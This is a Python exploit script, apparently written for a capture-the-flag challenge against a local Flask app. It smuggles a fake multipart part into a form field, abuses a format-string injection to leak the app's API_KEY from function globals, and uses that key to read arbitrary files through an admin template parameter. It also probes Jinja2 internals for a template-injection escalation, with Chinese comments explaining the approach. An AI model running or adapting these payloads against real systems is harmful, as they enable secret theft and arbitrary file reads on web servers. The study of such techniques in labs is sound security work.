import httpx
import re

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=30.0)
        return r.text, r.status_code
    except Exception as e:
        return str(e), 0

def debug_format(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = payload + fake_action_part
    if len(text) > 300:
        print(f"[-] Payload too long: {len(text)}")
        return None
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    try:
        r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
        return r.text
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 思路：利用 Python 对象的 __doc__ 属性
    # 很多对象的 __doc__ 包含 {{ }} 示例
    print("\n[*] Checking __doc__ attributes for SSTI...")
    
    # Jinja2 Environment 的 __doc__ 可能包含示例
    result = debug_format("{0.jinja_env.__class__.__doc__}")
    if result:
        print(f"jinja_env.__doc__: {result[:300]}...")
        if '{{' in result:
            print("[!] Contains {{ }}!")
    
    # 检查 lipsum 函数的 __doc__
    result = debug_format("{0.jinja_env.globals[lipsum].__doc__}")
    if result:
        print(f"lipsum.__doc__: {result[:300]}...")
        if '{{' in result:
            print("[!] Contains {{ }}!")
    
    # 检查 url_for 的 __doc__
    result = debug_format("{0.jinja_env.globals[url_for].__doc__}")
    if result:
        print(f"url_for.__doc__: {result[:300]}...")
    
    # 核心思路：在 format string 中访问某个对象，该对象的 str() 表示包含 {{ }}
    # 比如某些模板节点对象
    
    # 检查 jinja2 的 nodes 模块
    print("\n[*] Checking jinja2 internal objects...")
    result = debug_format("{0.jinja_env.lexer}")
    print(f"jinja_env.lexer: {result}")
    
    result = debug_format("{0.jinja_env.undefined}")
    print(f"jinja_env.undefined: {result}")
    
    # 检查 Flask 的 config
    result = debug_format("{0.config}")
    print(f"app.config: {result[:300] if result else 'None'}...")
